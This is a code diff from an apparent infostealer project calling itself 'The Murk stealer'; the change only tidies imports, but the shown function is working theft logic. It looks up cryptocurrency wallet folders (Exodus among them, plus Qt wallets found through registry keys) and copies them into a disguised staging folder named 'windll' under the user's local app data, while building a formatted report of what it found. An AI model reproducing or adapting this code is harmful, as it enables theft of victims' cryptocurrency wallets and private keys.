@@ -10,18 +10,19 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-import os
-import winreg
+from os import getenv, mkdir
+from os.path import exists
+from winreg import QueryValue,HKEY_CURRENT_USER,OpenKey
 from manager.logger import Log
-import shutil
+from shutil import copytree
 
 
 def Wallets():
     msgInfo = ""
     Log("===========Wallets===========")
     msgInfo+="\n\n\n<b>💰Wallets💰</b>"
-    roaming = os.getenv('APPDATA')
-    pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll\\Wallets"
+    roaming = getenv('APPDATA')
+    pathToLogs = f"{getenv('LOCALAPPDATA')}\\windll\\Wallets"
 
     directory = {
         'Exodus': roaming + '\\Exodus\\exodus.wallet\\',
@@ -44,24 +45,24 @@ def Wallets():
     wallets = []
 
     for key, value in directory.items():
-        if os.path.exists(value):
+        if exists(value):
             wallets.append(value)
             msgInfo+=f"\n∟💸{key}"
 
     for wallet in registry_directory:
         try:
-            registryKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\" + wallet + "\\" + wallet + "-Qt")
+            registryKey = OpenKey(HKEY_CURRENT_USER, "Software\\" + wallet + "\\" + wallet + "-Qt")
 
-            cdir = winreg.QueryValue(registryKey, "strDataDir") + "\\wallets"
-            if os.path.exists(cdir):
+            cdir = QueryValue(registryKey, "strDataDir") + "\\wallets"
+            if exists(cdir):
                 wallets.append(cdir)
         except Exception as e:
             Log(f"Wallets {wallet} ---> {e}")
     
     if wallets:
-        os.mkdir(pathToLogs)
+        mkdir(pathToLogs)
         for wallet in wallets:
-            shutil.copytree(wallet, pathToLogs+"\\"+wallet.split("\\")[-2], False, None, dirs_exist_ok=True)
+            copytree(wallet, pathToLogs+"\\"+wallet.split("\\")[-2], False, None, dirs_exist_ok=True)
 
     return msgInfo
 
